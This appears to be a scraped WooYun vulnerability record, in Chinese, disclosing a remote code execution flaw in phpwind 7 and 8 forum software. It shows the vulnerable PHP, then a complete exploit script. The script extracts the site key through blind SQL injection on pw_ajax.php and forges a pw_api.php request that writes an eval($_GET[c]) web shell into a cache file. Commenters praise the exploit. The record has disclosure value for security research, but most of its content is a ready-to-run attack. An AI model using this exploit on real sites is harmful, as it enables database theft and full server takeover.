{"id": 24215, "wybug_id": "wooyun-2010-0417", "wybug_title": "phpwind远程代码执行漏洞", "wybug_corp": "phpwind", "wybug_author": "结界师", "wybug_date": "2010-09-05 20:46", "wybug_open_date": "2010-09-06 11:45", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-09-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-09-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： phpwind较高版本论坛中存在一个严重的漏洞，成功利用该漏洞可以远程执行任意php代码，影响phpwind 7和phpwind 8 详细说明：  pw_ajax.php中的\n} elseif ($action == 'pcdelimg') {\tInitGP(array('fieldname','pctype'));\tInitGP(array('tid','id'),2);\tif (!$tid || !$id || !$fieldname || !$pctype) {\t\techo 'fail';\t}\t$id = (int)$id;\tif ($pctype == 'topic') {\t\t$tablename = GetTopcitable($id);\t} elseif ($pctype == 'postcate') {\t\t$tablename = GetPcatetable($id);\t}\t$path = $db->get_value(\"SELECT $fieldname FROM $tablename WHERE tid=\". pwEscape($tid));\nfieldname未经任何有效的过滤（全局的一些其他的比较搞笑看起来不错的过滤对这里不起任何安全上的意义，只是对漏洞利用带来了一些难度），利用该注射可以获取任何数据库里的数据。另外class_other.php中存在一个任意命令执行的漏洞\nfunction threadscateGory($classdb) {//生成帖子交换分类            $classcache = \"<?php\\r\\n\\$info_class=array(\\r\\n\";        foreach ($classdb as $key => $class) {            !$class['ifshow'] && $class['ifshow'] = '0';            $flag && $info_class[$class['cid']]['ifshow'] && $class['ifshow'] = '1';            $class['name'] = str_replace(array('\"',\"'\"),array(\"&quot;\",\"&#39;\"),$class['name']);            $classcache .= \"'$class[cid]'=>\".pw_var_export($class).\",\\r\\n\\r\\n\";        }        $classcache .= \");\\r\\n?>\";        writeover(D_P.\"data/bbscache/info_class.php\",$classcache);    }\n$class[cid]未经过滤，进入此逻辑需要一些较为关键的key，借助上面的注射漏洞即可获得该key   漏洞证明：  Poc:\n<?phpecho \" Info: Poc for Phpwind远程命令执行Test: exploit.php user password http://www.wooyun.org/phpwind/\";if($argc<3){\techo \"\\r\\n参数缺少\\r\\n\";\tdie();}$user=$argv[1];$pass=$argv[2];$pwurl=$argv[3];$myheader=array(\t\t'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',        'Accept-Language: zh-cn,zh;q=0.5',\t\t'Accept-Charset: gb2312,utf-8;q=0.7,*;q=0.7',\t\t'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',\t\t'Referer: http://www.wooyun.org/',        'Connection: Keep-Alive',         'Cache-Control: no-cache',\t\t'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; InfoPath.2)'    );$cookie=\"\";$str=curlsend(\"$pwurl/login.php?\",\"POST\",0,$myheader,\"forward=&jumpurl=http%3A%2F%2F127.0.0.1%2FPHPWind/upload%2F&step=2&lgt=0&pwuser=$user&pwpwd=$pass&hideid=0&cktime=31536000&submit=%B5%C7%C2%BC\",1);preg_match_all(\"/Set-Cookie:([^;]+)/is\",$str,$array);for($i=0;$i<count($array[1]);$i++){\t$cookie=$cookie.\";\".$array[1][$i];}//echo $cookie;$test = curlsend('$pwurl/pw_ajax.php',\"POST\",0,$myheader,'',1);if(strpos($test,'<ajax>')) {\tdie('用户密码或者其他参数错误');}$shellcode=\"action=pcdelimg&fieldname=db_value%20from%20pw_config%20where%20db_name%20like%200x64625f736974656f776e65726964%20and%20db_value%20like%200x{offset}25%20union%20select%200x612e2e;%23\";$hash=\"0123456789abcdef\";$craked=\"\";for($i=0;$i<32;$i++){\tfor($n=0;$n<16;$n++){\t\t$tmp=str_replace(\"{offset}\",bin2hex($craked.$hash[$n]),$shellcode);\t\t$tmp=curlsend(\"$pwurl/pw_ajax.php\",\"POST\",0,$myheader,$tmp,0);\t\tif(strpos($tmp,\"pw_config\")){\t\t\techo \"CrackEd Offset \".($i+1).\" :\".$hash[$n].\"\\r\\n\";\t\t\t$craked=$craked.$hash[$n];\t\t\tbreak;\t\t}\t}}echo \"Craked Magicdata :\".$craked.\"\\r\\n\";echo \"Get shell :\";//another 0day$arg='';$hack = array();$hack['mode'] = 'Other';$hack['method'] = 'threadscateGory';$hack['params'] = 'a:1:{s:3:\"cid\";a:1:{s:3:\"cid\";a:1:{s:3:\"cid\";s:21:\"\\'.eval($_GET[c]).\\'abc\";}}}';$hack['type'] = 'app';$hack = strips($hack);ksort($hack);reset($hack);foreach ($hack as $key => $value) {\tif ($value && $key != 'sig') {\t\t$arg .= \"$key=$value&\";\t}}$arg.='sig='.md5($arg.$craked);echo file_get_contents(\"$pwurl/pw_api.php?\".$arg);echo \"OK\\r\\n\";$str=file_get_contents(\"$pwurl/data/bbscache/info_class.php?c=echo%20Just_wooyun;\");if(strpos($str,'wooyun')){\techo \"Got shell :\".\"$pwurl/data/bbscache/info_class.php?c=phpinfo();\";\techo \"\\r\\nOver!\";}function strips($param) {\tif (is_array($param)) {\t\tforeach ($param as $key => $value) {\t\t\t$param[$key] = strips($value);\t\t}\t} else {\t\t$param = stripslashes($param);\t}\treturn $param;}function curlsend($url,$method=false,$ssl=0,$myheader,$data='',$header=0){global $cookie;$ch = curl_init();$timeout = 0; // set to zero for no timeoutcurl_setopt ($ch, CURLOPT_URL, $url);curl_setopt ($ch, CURLOPT_POST, $method);curl_setopt($ch,CURLOPT_HTTPHEADER,$myheader);curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);curl_setopt ($ch, CURLOPT_COOKIE, $cookie);if($data){curl_setopt ($ch, CURLOPT_POSTFIELDS,$data);}curl_setopt ($ch, CURLOPT_HEADER, $header);if($ssl){\tcurl_setopt($ch,  CURLOPT_SSL_VERIFYPEER,  FALSE);}$handles = curl_exec($ch);curl_close($ch);//echo $handles;return $handles;}\n\n\n\n\n   修复方案：  深入进去过滤吧...   版权声明：转载请注明来源 结界师@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：20 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2013-05-22 10:26 |    \t\t烨少 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        )\t\t \n  围观一下    \n     2013-08-11 16:13 |    \t\tgodlong \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:7        | 戴着白色帽子的白帽子...)\t\t \n  exp编写能力真强！    \n     2013-09-24 22:22 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:20        | 天一)\t\t \n  给力！    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 20, "Ranks": null}